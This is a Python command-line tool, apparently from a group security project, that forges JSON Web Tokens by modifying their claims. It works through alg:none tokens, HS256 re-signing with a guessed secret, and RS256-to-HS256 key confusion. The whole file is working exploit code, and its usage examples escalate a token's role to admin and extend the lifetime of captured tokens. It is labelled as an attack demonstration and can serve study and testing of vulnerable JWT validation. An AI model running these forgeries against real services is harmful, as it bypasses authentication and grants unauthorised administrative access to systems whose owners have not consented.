"""
=============================================================================
ATTACK 3: Arbitrary JWT Claim Forging
=============================================================================
Person 2 — Offensive JWT Attack Toolkit

PURPOSE:
  Interactive toolkit for modifying JWT claims without a valid signing key.
  Useful when targeting alg:none endpoints, or combined with alg confusion.

FEATURES:
  - Decode any JWT (without verification)
  - Modify arbitrary claims (role, sub, exp, iat, custom fields)
  - Re-encode with alg:none or HS256 (with known/guessed secret)
  - Extend/expire token lifetime
  - Escalate privileges (role=user → role=admin)

USAGE:
  # Decode a token
  python forge_claims.py --action decode --token <JWT>

  # Forge admin token (alg:none)
  python forge_claims.py --action forge-none --token <JWT> --set role=admin

  # Forge with known HMAC secret
  python forge_claims.py --action forge-hmac --token <JWT> --secret mysecret --set role=admin sub=hacker

  # Extend expiry by 24h
  python forge_claims.py --action extend --token <JWT> --hours 24
=============================================================================
"""

import sys
import json
import hmac
import hashlib
import argparse
from datetime import datetime, timedelta
from utils import (
    decode_jwt_parts,
    b64url_encode,
    b64url_decode,
    print_banner,
    print_success,
    print_error,
    print_info,
    pretty_print_jwt,
)


# ─────────────────────────────────────────────────────────────
# CORE FORGING FUNCTIONS
# ─────────────────────────────────────────────────────────────

def forge_none(original_token: str, claim_overrides: dict) -> str:
    """
    Forge a JWT with alg=none (no signature).

    Modifies specified claims and removes the signature entirely.
    The server accepts the token if it's vulnerable to alg:none.

    Args:
        original_token:  Any JWT (will be decoded without verification)
        claim_overrides: Dict of claims to set {key: value}

    Returns:
        Forged JWT string (alg=none, empty signature)
    """
    _, payload, _ = decode_jwt_parts(original_token)

    # Apply overrides
    new_payload = payload.copy()
    new_payload.update(claim_overrides)

    # Force alg=none header
    new_header = {"alg": "none", "typ": "JWT"}

    h_enc = b64url_encode(json.dumps(new_header, separators=(",", ":")))
    p_enc = b64url_encode(json.dumps(new_payload, separators=(",", ":")))

    return f"{h_enc}.{p_enc}."  # empty signature


def forge_hmac(original_token: str, secret: str, claim_overrides: dict) -> str:
    """
    Forge a JWT signed with a known/guessed HMAC secret.

    Use this when you've discovered or brute-forced the HS256 secret.

    Args:
        original_token:  Any JWT (payload template)
        secret:          HMAC secret (string or hex)
        claim_overrides: Dict of claims to set

    Returns:
        Forged JWT string with valid HS256 signature
    """
    _, payload, _ = decode_jwt_parts(original_token)

    new_payload = payload.copy()
    new_payload.update(claim_overrides)

    new_header = {"alg": "HS256", "typ": "JWT"}

    h_enc = b64url_encode(json.dumps(new_header, separators=(",", ":")))
    p_enc = b64url_encode(json.dumps(new_payload, separators=(",", ":")))

    signing_input = f"{h_enc}.{p_enc}".encode("utf-8")
    key = secret.encode("utf-8") if isinstance(secret, str) else secret

    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    sig_enc = b64url_encode(sig)

    return f"{h_enc}.{p_enc}.{sig_enc}"


def forge_with_public_key(original_token: str, public_key_pem: bytes, claim_overrides: dict) -> str:
    """
    Forge a JWT signed with HS256 using RSA public key as HMAC secret.
    (RS256→HS256 confusion — convenience wrapper)
    """
    return forge_hmac(original_token, public_key_pem, claim_overrides)


def extend_expiry(original_token: str, hours: int = 24) -> tuple[str, dict]:
    """
    Extend a JWT's expiry time (useful for keeping a captured token alive).

    Note: This modifies exp/iat but CANNOT produce a valid signature unless
    alg:none is used — pair with forge_none for a working token.

    Returns:
        (modified_token_unsigned, new_payload)
    """
    _, payload, _ = decode_jwt_parts(original_token)

    now = datetime.utcnow()
    new_payload = payload.copy()
    new_payload["iat"] = int(now.timestamp())
    new_payload["exp"] = int((now + timedelta(hours=hours)).timestamp())

    return forge_none(original_token, new_payload), new_payload


def escalate_privileges(original_token: str, new_role: str = "admin") -> str:
    """
    Escalate role claim in a JWT (user → admin).

    Combines role override with alg:none bypass.
    """
    return forge_none(original_token, {"role": new_role})


# ─────────────────────────────────────────────────────────────
# CLI Actions
# ─────────────────────────────────────────────────────────────

def action_decode(token: str):
    """Pretty print a JWT without verification."""
    print_banner("JWT Decoder (no verification)")
    pretty_print_jwt(token)


def action_forge_none(token: str, overrides: dict):
    """Forge a JWT with alg=none."""
    print_banner("Forge: alg=none JWT")

    print_info("Original JWT:")
    pretty_print_jwt(token)

    forged = forge_none(token, overrides)

    print_success(f"\nForged token (alg=none):")
    print(f"\n  {forged}\n")

    print_info("Forged JWT:")
    pretty_print_jwt(forged)


def action_forge_hmac(token: str, secret: str, overrides: dict):
    """Forge a JWT with known HMAC secret."""
    print_banner("Forge: HS256 with known secret")

    print_info("Original JWT:")
    pretty_print_jwt(token)

    forged = forge_hmac(token, secret, overrides)

    print_success(f"\nForged token (HS256, secret='{secret}'):")
    print(f"\n  {forged}\n")

    print_info("Forged JWT:")
    pretty_print_jwt(forged)


def action_extend(token: str, hours: int):
    """Extend JWT expiry."""
    print_banner(f"Extend JWT Expiry by {hours}h")

    forged, new_payload = extend_expiry(token, hours)

    new_exp = datetime.utcfromtimestamp(new_payload["exp"])
    print_success(f"New expiry: {new_exp.isoformat()} UTC")
    print_success(f"\nForged token:")
    print(f"\n  {forged}\n")


def parse_overrides(pairs: list[str]) -> dict:
    """
    Parse KEY=VALUE pairs from CLI args into a dict.
    Attempts to cast integers and booleans automatically.
    """
    result = {}
    for pair in pairs:
        if "=" not in pair:
            print_error(f"Invalid override format: '{pair}' (expected KEY=VALUE)")
            sys.exit(1)
        key, _, value = pair.partition("=")
        # Auto-cast
        if value.isdigit():
            result[key] = int(value)
        elif value.lower() in ("true", "false"):
            result[key] = value.lower() == "true"
        else:
            result[key] = value
    return result


# ─────────────────────────────────────────────────────────────
# CLI Entry Point
# ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="JWT Claim Forger — modify JWT claims for attack demonstration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Actions:
  decode      — Decode and display a JWT
  forge-none  — Forge JWT with alg=none (no signature)
  forge-hmac  — Forge JWT with known HMAC secret
  extend      — Extend JWT expiry (outputs alg=none token)

Examples:
  python forge_claims.py --action decode --token eyJ...

  python forge_claims.py --action forge-none --token eyJ... --set role=admin

  python forge_claims.py --action forge-hmac --token eyJ... --secret supersecretkey123 --set role=admin sub=hacker

  python forge_claims.py --action extend --token eyJ... --hours 48
        """,
    )
    parser.add_argument("--action",  required=True,  choices=["decode", "forge-none", "forge-hmac", "extend"])
    parser.add_argument("--token",   required=True,  help="JWT token string")
    parser.add_argument("--set",     nargs="*", default=[], metavar="KEY=VALUE", help="Claim overrides")
    parser.add_argument("--secret",  default="",     help="HMAC secret for forge-hmac")
    parser.add_argument("--hours",   type=int, default=24, help="Hours to extend expiry")

    args = parser.parse_args()

    overrides = parse_overrides(args.set)

    if args.action == "decode":
        action_decode(args.token)
    elif args.action == "forge-none":
        action_forge_none(args.token, overrides)
    elif args.action == "forge-hmac":
        if not args.secret:
            print_error("--secret is required for forge-hmac")
            sys.exit(1)
        action_forge_hmac(args.token, args.secret, overrides)
    elif args.action == "extend":
        action_extend(args.token, args.hours)


if __name__ == "__main__":
    main()
